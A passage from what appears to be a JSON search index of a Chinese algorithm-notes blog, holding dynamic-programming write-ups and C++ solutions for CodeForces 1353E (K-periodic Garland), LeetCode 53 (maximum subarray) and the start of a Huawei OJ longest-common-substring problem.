\u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/5.CodeForces_1353_E_K-periodic_Garland/","text":"CodeForces 1353 E. K-periodic Garland # \u76ee\u5f55 # CodeForces 1353 E. K-periodic Garland \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Onput 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1 second Memory Limit: 256 megabytes 1.2. Problem Description # You are given a garland consisting of n lamps. States of the lamps are represented by the string s of length n . The i -th character of the string s_i equals ' 0 ' if the i -th lamp is turned off or ' 1 ' if the i -th lamp is turned on. You are also given a positive integer k . In one move, you can choose one lamp and change its state (i.e. turn it on if it is turned off and vice versa). The garland is called k -periodic if the distance between each pair of adjacent turned on lamps is exactly k . Consider the case k=3 . Then garlands \" 00010010 \", \" 1001001 \", \" 00010 \" and \" 0 \" are good but garlands \" 00101001 \", \" 1000001 \" and \" 01001100 \" are not. Note that the garland is not cyclic , i.e. the first turned on lamp is not going after the last turned on lamp and vice versa. Your task is to find the minimum number of moves you need to make to obtain k -periodic garland from the given one. You have to answer t independent test cases. 1.3. Input # The first line of the input contains one integer t ( 1 \\le t \\le 25~ 000 ) \u2014 the number of test cases. Then t test cases follow. The first line of the test case contains two integers n and k ( 1 \\le n \\le 10^6; 1 \\le k \\le n ) \u2014 the length of s and the required period. The second line of the test case contains the string s consisting of n characters ' 0 ' and ' 1 '. It is guaranteed that the sum of n over all test cases does not exceed 10^6 ( \\sum n \\le 10^6 ). 1.4. Output # For each test case, print the answer \u2014 the minimum number of moves you need to make to obtain k -periodic garland from the given one. 1.5. Sample Input # 6 9 2 010001010 9 3 111100000 7 4 1111111 10 3 1001110101 1 1 1 1 1 0 1.6. Sample Onput # 1 2 5 4 0 0 1.7. Source # CodeForces 1353 E. K-periodic Garland 2. \u89e3\u8bfb # \u52a8\u6001\u89c4\u5212\u3002 \u9898\u76ee\u53ea\u8981\u6c42\u6240\u6709\u76f8\u90bb\u7684\u4eae\u7740\u7684\u706f\u4e4b\u95f4\u7684\u76f8\u9694\u8ddd\u79bb\u4e3a k \uff0c\u6240\u6709\u706f\u90fd\u706d (000) \u548c\u53ea\u6709\u4e00\u76cf\u706f\u4eae (010) \u7684\u60c5\u51b5\u90fd\u7b26\u5408\u8981\u6c42\u3002 \u4f7f s(x) \u8868\u793a\u7b2c x \u76cf\u706f\u521d\u59cb\u72b6\u6001\u4e3a\u4eae (s(x) = 1) \u8fd8\u662f\u706d (s(x) = 0) \uff0c f(x) \u4e3a\u7b2c x \u76cf\u706f \u4ee5\u524d \u6240\u6709\u7684\u706f\u7684\u6700\u5c0f\u5f00\u5173\u6b21\u6570\uff0c p(x) \u4e3a\u524d\u7f00\u548c\uff0c\u5373 [0,x] \u533a\u95f4\u5185\u6240\u6709\u4eae\u7740\u7684\u706f\u7684\u6570\u91cf \\displaystyle p(x) = \\sum_{i=1}^n s(x) \u3002 \u9012\u63a8\u8ba1\u7b97\uff0c\u6bd4\u8f83\u82e5\u4f7f\u7b2c x \u4e2a\u706f\u4eae\uff0c x \u4ee5\u524d\u7684\u706f\u5168\u706d\u9700\u8981\u7684\u5f00\u5173\u6b21\u6570 p(x-1) \u548c\u6309\u7167 k \u95f4\u9694\u6253\u5f00\u7684\u5f00\u5173\u6b21\u6570 f(x - k) + p(x - 1)- p(x - k - 1) \uff0c\u53d6\u4e24\u8005\u4e2d\u7684\u6700\u5c0f\u503c\u3002 f(x) = \\min (p(x-1), f(x - k) + p(x - 1)- p(x - k - 1)) \u5982\u679c s(x) = 0 \uff0c f(x) \u9700\u8981\u518d\u52a0 1 \u3002 \u4f7f g(x) \u4e3a\u7b2c x \u76cf\u706f \u4ee5\u540e \u6240\u6709\u7684\u706f\u7684\u6700\u5c0f\u5f00\u5173\u6b21\u6570\u3002\u540c\u4e0a\u3002 g(i) = \\min (p(n) - p(x), g(x + k) + p(x + k - 1) - p(x)); \u5982\u679c s(x) = 0 \uff0c g(x) \u9700\u8981\u518d\u52a0 1 \u3002 \u90a3\u4e48\u6700\u7ec8\u7ed3\u679c\u4e3a ans = {\\left\\{ \\begin{aligned} &f(x) + g(x) & , s(x) = 1 \\\\ &f(x) + g(x) - 1 & , s(x) = 0 \\\\ \\end{aligned}\\right. } \u8fd9\u91cc\u7684\u51cf 1 \u662f\u4e3a\u4e86\u53bb\u9664\u5f53 s(x) = 0 \u7684\u91cd\u590d\u8ba1\u7b97\u3002 3. \u4ee3\u7801 # #include <iostream> using namespace std; const int N = 1e6 + 10; int t, n, k; int pre[N], f[N], g[N]; char s[N]; int main() { int i, ans, x; scanf(\"%d\", &t); while (t--) { scanf(\"%d%d\", &n, &k); scanf(\"%s\", s); // \u8ba1\u7b97\u524d\u7f00\u548c for (i = 0; i < n; i++) pre[i + 1] = pre[i] + s[i] - '0'; // \u82e5\u5168\u4e3a0\uff0c\u8f93\u51fa0 if (pre[n] == 0) { printf(\"0\\n\"); continue; } // \u9012\u63a8\u8ba1\u7b97\uff0c\u6bd4\u8f83\u82e5\u4f7fi\u4e3a\u6253\u5f00\u72b6\u6001 // i\u70b9\u4ee5\u524d\u7684\u706f\u5168\u706d\u9700\u8981\u7684\u5f00\u5173\u6b21\u6570pre[i - 1] // \u548c\u6309\u7167k\u95f4\u9694\u6253\u5f00\u7684\u5f00\u5173\u6b21\u6570 for (i = 1; i <= n; i++) { f[i] = pre[i - 1]; // \u82e5\u524d\u9762\u6709k\u4e2a\u5143\u7d20 // \u524d\u8005\u4e3a\u524d\u7f00\u548c\uff0c\u5373i\u70b9\u4ee5\u524d\u7684\u706f\u5168\u706d\u7684\u5f00\u5173\u6b21\u6570 if (i - k > 0) f[i] = min(f[i], f[i - k] + pre[i - 1] - pre[i - k - 1]); if (s[i - 1] == '0') f[i]++; } // \u9012\u63a8\u8ba1\u7b97\uff0c\u6bd4\u8f83i\u70b9\u4ee5\u540e\u7684\u706f\u5168\u706d\u9700\u8981\u7684\u5f00\u5173\u6b21\u6570 // \u548c\u6309\u7167k\u95f4\u9694\u6253\u5f00\u7684\u5f00\u5173\u6b21\u6570 for (i = n; i >= 1; i--) { g[i] = pre[n] - pre[i]; if (i + k <= n) g[i] = min(g[i], g[i + k] + pre[i + k - 1] - pre[i]); if (s[i - 1] == '0') g[i]++; } // \u8ba1\u7b97\u6700\u7ec8\u7ed3\u679c ans = n + 1; for (i = 1; i <= n; i++) { x = f[i] + g[i]; // \u53bb\u9664\u91cd\u590d\u8ba1\u7b97 if (s[i - 1] == '0') x--; if (x < ans) ans = x; } // \u8f93\u51fa printf(\"%d\\n\", ans); } return 0; } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"5.CodeForces 1353 E K periodic Garland"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/5.CodeForces_1353_E_K-periodic_Garland/#codeforces-1353-e-k-periodic-garland","text":"","title":"CodeForces 1353 E. K-periodic Garland"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/5.CodeForces_1353_E_K-periodic_Garland/#_1","text":"CodeForces 1353 E. K-periodic Garland \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Onput 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/5.CodeForces_1353_E_K-periodic_Garland/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/5.CodeForces_1353_E_K-periodic_Garland/#11-limit","text":"Time Limit: 1 second Memory Limit: 256 megabytes","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/5.CodeForces_1353_E_K-periodic_Garland/#12-problem-description","text":"You are given a garland consisting of n lamps. States of the lamps are represented by the string s of length n . The i -th character of the string s_i equals ' 0 ' if the i -th lamp is turned off or ' 1 ' if the i -th lamp is turned on. You are also given a positive integer k . In one move, you can choose one lamp and change its state (i.e. turn it on if it is turned off and vice versa). The garland is called k -periodic if the distance between each pair of adjacent turned on lamps is exactly k . Consider the case k=3 . Then garlands \" 00010010 \", \" 1001001 \", \" 00010 \" and \" 0 \" are good but garlands \" 00101001 \", \" 1000001 \" and \" 01001100 \" are not. Note that the garland is not cyclic , i.e. the first turned on lamp is not going after the last turned on lamp and vice versa. Your task is to find the minimum number of moves you need to make to obtain k -periodic garland from the given one. You have to answer t independent test cases.","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/5.CodeForces_1353_E_K-periodic_Garland/#13-input","text":"The first line of the input contains one integer t ( 1 \\le t \\le 25~ 000 ) \u2014 the number of test cases. Then t test cases follow. The first line of the test case contains two integers n and k ( 1 \\le n \\le 10^6; 1 \\le k \\le n ) \u2014 the length of s and the required period. The second line of the test case contains the string s consisting of n characters ' 0 ' and ' 1 '. It is guaranteed that the sum of n over all test cases does not exceed 10^6 ( \\sum n \\le 10^6 ).","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/5.CodeForces_1353_E_K-periodic_Garland/#14-output","text":"For each test case, print the answer \u2014 the minimum number of moves you need to make to obtain k -periodic garland from the given one.","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/5.CodeForces_1353_E_K-periodic_Garland/#15-sample-input","text":"6 9 2 010001010 9 3 111100000 7 4 1111111 10 3 1001110101 1 1 1 1 1 0","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/5.CodeForces_1353_E_K-periodic_Garland/#16-sample-onput","text":"1 2 5 4 0 0","title":"1.6. Sample Onput"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/5.CodeForces_1353_E_K-periodic_Garland/#17-source","text":"CodeForces 1353 E. K-periodic Garland","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/5.CodeForces_1353_E_K-periodic_Garland/#2","text":"\u52a8\u6001\u89c4\u5212\u3002 \u9898\u76ee\u53ea\u8981\u6c42\u6240\u6709\u76f8\u90bb\u7684\u4eae\u7740\u7684\u706f\u4e4b\u95f4\u7684\u76f8\u9694\u8ddd\u79bb\u4e3a k \uff0c\u6240\u6709\u706f\u90fd\u706d (000) \u548c\u53ea\u6709\u4e00\u76cf\u706f\u4eae (010) \u7684\u60c5\u51b5\u90fd\u7b26\u5408\u8981\u6c42\u3002 \u4f7f s(x) \u8868\u793a\u7b2c x \u76cf\u706f\u521d\u59cb\u72b6\u6001\u4e3a\u4eae (s(x) = 1) \u8fd8\u662f\u706d (s(x) = 0) \uff0c f(x) \u4e3a\u7b2c x \u76cf\u706f \u4ee5\u524d \u6240\u6709\u7684\u706f\u7684\u6700\u5c0f\u5f00\u5173\u6b21\u6570\uff0c p(x) \u4e3a\u524d\u7f00\u548c\uff0c\u5373 [0,x] \u533a\u95f4\u5185\u6240\u6709\u4eae\u7740\u7684\u706f\u7684\u6570\u91cf \\displaystyle p(x) = \\sum_{i=1}^n s(x) \u3002 \u9012\u63a8\u8ba1\u7b97\uff0c\u6bd4\u8f83\u82e5\u4f7f\u7b2c x \u4e2a\u706f\u4eae\uff0c x \u4ee5\u524d\u7684\u706f\u5168\u706d\u9700\u8981\u7684\u5f00\u5173\u6b21\u6570 p(x-1) \u548c\u6309\u7167 k \u95f4\u9694\u6253\u5f00\u7684\u5f00\u5173\u6b21\u6570 f(x - k) + p(x - 1)- p(x - k - 1) \uff0c\u53d6\u4e24\u8005\u4e2d\u7684\u6700\u5c0f\u503c\u3002 f(x) = \\min (p(x-1), f(x - k) + p(x - 1)- p(x - k - 1)) \u5982\u679c s(x) = 0 \uff0c f(x) \u9700\u8981\u518d\u52a0 1 \u3002 \u4f7f g(x) \u4e3a\u7b2c x \u76cf\u706f \u4ee5\u540e \u6240\u6709\u7684\u706f\u7684\u6700\u5c0f\u5f00\u5173\u6b21\u6570\u3002\u540c\u4e0a\u3002 g(i) = \\min (p(n) - p(x), g(x + k) + p(x + k - 1) - p(x)); \u5982\u679c s(x) = 0 \uff0c g(x) \u9700\u8981\u518d\u52a0 1 \u3002 \u90a3\u4e48\u6700\u7ec8\u7ed3\u679c\u4e3a ans = {\\left\\{ \\begin{aligned} &f(x) + g(x) & , s(x) = 1 \\\\ &f(x) + g(x) - 1 & , s(x) = 0 \\\\ \\end{aligned}\\right. } \u8fd9\u91cc\u7684\u51cf 1 \u662f\u4e3a\u4e86\u53bb\u9664\u5f53 s(x) = 0 \u7684\u91cd\u590d\u8ba1\u7b97\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/5.CodeForces_1353_E_K-periodic_Garland/#3","text":"#include <iostream> using namespace std; const int N = 1e6 + 10; int t, n, k; int pre[N], f[N], g[N]; char s[N]; int main() { int i, ans, x; scanf(\"%d\", &t); while (t--) { scanf(\"%d%d\", &n, &k); scanf(\"%s\", s); // \u8ba1\u7b97\u524d\u7f00\u548c for (i = 0; i < n; i++) pre[i + 1] = pre[i] + s[i] - '0'; // \u82e5\u5168\u4e3a0\uff0c\u8f93\u51fa0 if (pre[n] == 0) { printf(\"0\\n\"); continue; } // \u9012\u63a8\u8ba1\u7b97\uff0c\u6bd4\u8f83\u82e5\u4f7fi\u4e3a\u6253\u5f00\u72b6\u6001 // i\u70b9\u4ee5\u524d\u7684\u706f\u5168\u706d\u9700\u8981\u7684\u5f00\u5173\u6b21\u6570pre[i - 1] // \u548c\u6309\u7167k\u95f4\u9694\u6253\u5f00\u7684\u5f00\u5173\u6b21\u6570 for (i = 1; i <= n; i++) { f[i] = pre[i - 1]; // \u82e5\u524d\u9762\u6709k\u4e2a\u5143\u7d20 // \u524d\u8005\u4e3a\u524d\u7f00\u548c\uff0c\u5373i\u70b9\u4ee5\u524d\u7684\u706f\u5168\u706d\u7684\u5f00\u5173\u6b21\u6570 if (i - k > 0) f[i] = min(f[i], f[i - k] + pre[i - 1] - pre[i - k - 1]); if (s[i - 1] == '0') f[i]++; } // \u9012\u63a8\u8ba1\u7b97\uff0c\u6bd4\u8f83i\u70b9\u4ee5\u540e\u7684\u706f\u5168\u706d\u9700\u8981\u7684\u5f00\u5173\u6b21\u6570 // \u548c\u6309\u7167k\u95f4\u9694\u6253\u5f00\u7684\u5f00\u5173\u6b21\u6570 for (i = n; i >= 1; i--) { g[i] = pre[n] - pre[i]; if (i + k <= n) g[i] = min(g[i], g[i + k] + pre[i + k - 1] - pre[i]); if (s[i - 1] == '0') g[i]++; } // \u8ba1\u7b97\u6700\u7ec8\u7ed3\u679c ans = n + 1; for (i = 1; i <= n; i++) { x = f[i] + g[i]; // \u53bb\u9664\u91cd\u590d\u8ba1\u7b97 if (s[i - 1] == '0') x--; if (x < ans) ans = x; } // \u8f93\u51fa printf(\"%d\\n\", ans); } return 0; } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/6.LeetCode_53_%E6%9C%80%E5%A4%A7%E5%AD%90%E5%BA%8F%E5%92%8C/","text":"LeetCode 53 \u6700\u5927\u5b50\u5e8f\u548c # \u76ee\u5f55 # LeetCode 53 \u6700\u5927\u5b50\u5e8f\u548c \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Sample Input 1 1.4. Sample Output 1 1.5. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u7ed9\u5b9a\u4e00\u4e2a\u6574\u6570\u6570\u7ec4 nums \uff0c\u627e\u5230\u4e00\u4e2a\u5177\u6709\u6700\u5927\u548c\u7684\u8fde\u7eed\u5b50\u6570\u7ec4\uff08\u5b50\u6570\u7ec4\u6700\u5c11\u5305\u542b\u4e00\u4e2a\u5143\u7d20\uff09\uff0c\u8fd4\u56de\u5176\u6700\u5927\u548c\u3002 1.3. Sample Input 1 # \u8f93\u5165: [-2,1,-3,4,-1,2,1,-5,4] 1.4. Sample Output 1 # \u8f93\u51fa: 6 \u89e3\u91ca: \u8fde\u7eed\u5b50\u6570\u7ec4 [4,-1,2,1] \u7684\u548c\u6700\u5927\uff0c\u4e3a 6\u3002 1.5. Source # LeetCode 53 \u6700\u5927\u5b50\u5e8f\u548c 2. \u89e3\u8bfb # \u52a8\u6001\u89c4\u5212\uff0c\u7528 f(i) \u4ee3\u8868\u4ee5\u7b2c i \u4e2a\u6570\u7ed3\u5c3e\u7684 \u8fde\u7eed\u5b50\u6570\u7ec4\u7684\u6700\u5927\u548c \uff0c\u9012\u63a8\u65b9\u7a0b\u5982\u4e0b\u3002 f(i) = max(f(i - 1) + a_i, a_i) \u4ee3\u7801\u53c2\u8003\u81ea \u5b98\u65b9\u9898\u89e3 \u3002 3. \u4ee3\u7801 # class Solution { public: int maxSubArray(vector<int>& nums) { int pre = 0, maxAns = nums[0]; for (const auto &x: nums) { pre = max(pre + x, x); maxAns = max(maxAns, pre); } return maxAns; } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"6.LeetCode 53 \u6700\u5927\u5b50\u5e8f\u548c"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/6.LeetCode_53_%E6%9C%80%E5%A4%A7%E5%AD%90%E5%BA%8F%E5%92%8C/#leetcode-53","text":"","title":"LeetCode 53 \u6700\u5927\u5b50\u5e8f\u548c"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/6.LeetCode_53_%E6%9C%80%E5%A4%A7%E5%AD%90%E5%BA%8F%E5%92%8C/#_1","text":"LeetCode 53 \u6700\u5927\u5b50\u5e8f\u548c \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Sample Input 1 1.4. Sample Output 1 1.5. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/6.LeetCode_53_%E6%9C%80%E5%A4%A7%E5%AD%90%E5%BA%8F%E5%92%8C/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/6.LeetCode_53_%E6%9C%80%E5%A4%A7%E5%AD%90%E5%BA%8F%E5%92%8C/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/6.LeetCode_53_%E6%9C%80%E5%A4%A7%E5%AD%90%E5%BA%8F%E5%92%8C/#12-problem-description","text":"\u7ed9\u5b9a\u4e00\u4e2a\u6574\u6570\u6570\u7ec4 nums \uff0c\u627e\u5230\u4e00\u4e2a\u5177\u6709\u6700\u5927\u548c\u7684\u8fde\u7eed\u5b50\u6570\u7ec4\uff08\u5b50\u6570\u7ec4\u6700\u5c11\u5305\u542b\u4e00\u4e2a\u5143\u7d20\uff09\uff0c\u8fd4\u56de\u5176\u6700\u5927\u548c\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/6.LeetCode_53_%E6%9C%80%E5%A4%A7%E5%AD%90%E5%BA%8F%E5%92%8C/#13-sample-input-1","text":"\u8f93\u5165: [-2,1,-3,4,-1,2,1,-5,4]","title":"1.3. Sample Input 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/6.LeetCode_53_%E6%9C%80%E5%A4%A7%E5%AD%90%E5%BA%8F%E5%92%8C/#14-sample-output-1","text":"\u8f93\u51fa: 6 \u89e3\u91ca: \u8fde\u7eed\u5b50\u6570\u7ec4 [4,-1,2,1] \u7684\u548c\u6700\u5927\uff0c\u4e3a 6\u3002","title":"1.4. Sample Output 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/6.LeetCode_53_%E6%9C%80%E5%A4%A7%E5%AD%90%E5%BA%8F%E5%92%8C/#15-source","text":"LeetCode 53 \u6700\u5927\u5b50\u5e8f\u548c","title":"1.5. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/6.LeetCode_53_%E6%9C%80%E5%A4%A7%E5%AD%90%E5%BA%8F%E5%92%8C/#2","text":"\u52a8\u6001\u89c4\u5212\uff0c\u7528 f(i) \u4ee3\u8868\u4ee5\u7b2c i \u4e2a\u6570\u7ed3\u5c3e\u7684 \u8fde\u7eed\u5b50\u6570\u7ec4\u7684\u6700\u5927\u548c \uff0c\u9012\u63a8\u65b9\u7a0b\u5982\u4e0b\u3002 f(i) = max(f(i - 1) + a_i, a_i) \u4ee3\u7801\u53c2\u8003\u81ea \u5b98\u65b9\u9898\u89e3 \u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/6.LeetCode_53_%E6%9C%80%E5%A4%A7%E5%AD%90%E5%BA%8F%E5%92%8C/#3","text":"class Solution { public: int maxSubArray(vector<int>& nums) { int pre = 0, maxAns = nums[0]; for (const auto &x: nums) { pre = max(pre + x, x); maxAns = max(maxAns, pre); } return maxAns; } }; \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/7.%E5%8D%8E%E4%B8%BAOJ_75_%E5%85%AC%E5%85%B1%E5%AD%90%E4%B8%B2%E8%AE%A1%E7%AE%97/","text":"\u534e\u4e3aOJ 75 \u516c\u5171\u5b50\u4e32\u8ba1\u7b97 # \u76ee\u5f55 # \u534e\u4e3aOJ 75 \u516c\u5171\u5b50\u4e32\u8ba1\u7b97 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u8ba1\u7b97\u4e24\u4e2a\u5b57\u7b26\u4e32\u7684\u6700\u5927\u516c\u5171\u5b57\u4e32\u7684\u957f\u5ea6\uff0c\u5b57\u7b26\u4e0d\u533a\u5206\u5927\u5c0f\u5199 1.3. Input # \u8f93\u5165\u4e24\u4e2a\u5b57\u7b26\u4e32 1.4. Output # \u8f93\u51fa\u4e00\u4e2a\u6574\u6570 1.5. Sample Input # asdfas werasdfaswer 1.6. Sample Output # 6 1.8. Source # \u534e\u4e3aOJ 75 \u516c\u5171\u5b50\u4e32\u8ba1\u7b97 2. \u89e3\u8bfb # \u52a8\u6001\u89c4\u5212\u3002 list[i][j] \u8868\u793a\u4ee5 str1[i-1]\u548cstr2[j-1] \u7ed3\u5c3e\u7684\u6700\u957f\u516c\u5171\u5b50\u4e32\uff0c \u9012\u63a8\u65b9\u7a0b\u5982\u4e0b\u3002 list[i][j] ={\\left\\{ \\begin{aligned} & list[i - 1][j - 1] + 1 & , (str1[i] = str2[j]) \\\\ & 0 & , (str1[i] \\neq str2[j]) \\\\ \\end{aligned}\\right. } 3. \u4ee3\u7801 # #include<iostream> using namespace std; const int MAXM = 1e3 + 1; int main(){ string str1, str2; cin>>str1>>str2; int list[MAXM][MAXM] = {{0}}; int maxAns = 0; for(int i = 1; i <= str1.size(); i++){ for(int j = 1; j <= str2.size(); j++){ if(toupper(str1[i-1])==toupper(str2[j-1])){ // 